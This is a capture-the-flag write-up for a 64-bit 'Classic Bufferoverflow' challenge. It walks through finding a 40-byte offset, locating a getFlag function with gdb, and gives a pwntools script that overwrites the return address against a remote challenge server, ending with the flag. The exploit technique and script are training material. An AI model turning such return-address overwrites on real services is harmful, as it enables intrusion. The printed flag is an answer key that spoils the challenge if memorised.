# Classic Bufferoverflow

***

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

***

### Solution

I think this is the trickiest challenge I have ever faced.

When i run the program, it will show something like `ltrace` or `strace` command.

<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

First of all when facing a buffer overflow challenge, find the offset which for this challenge is 40 bytes.

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption><p>Notice that <code>Better luck next time!</code> did not printed in the image below means that we hit the offset value</p></figcaption></figure>

Next, I went through the code using `gdb-gef` and I found 3 functions, `main`, `getFlag` and `getInput`.

The target is the function `getFlag`, obviously to give me the flag. So, i get the address of the function which is `0x00000000004011d6` and use the same technique in challenge Don't Overboard 2.

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

So, i made a simple script to ease my life

{% code title="solve.py" lineNumbers="true" fullWidth="true" %}
```python
from pwn import *
context.bits=64
conn = ELF('./challenge.bin')

rem=remote('3.26.44.175',3336)

offset=40
addr=0x004011d6

payload=b"a"*offset
payload+=p64(addr)

rem.sendline(payload)
rem.interactive()
```
{% endcode %}

Just run it and the flag is already served.

<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

***

### Flag

CURTIN\_CTF{B4S1C\_0V3RF10W}
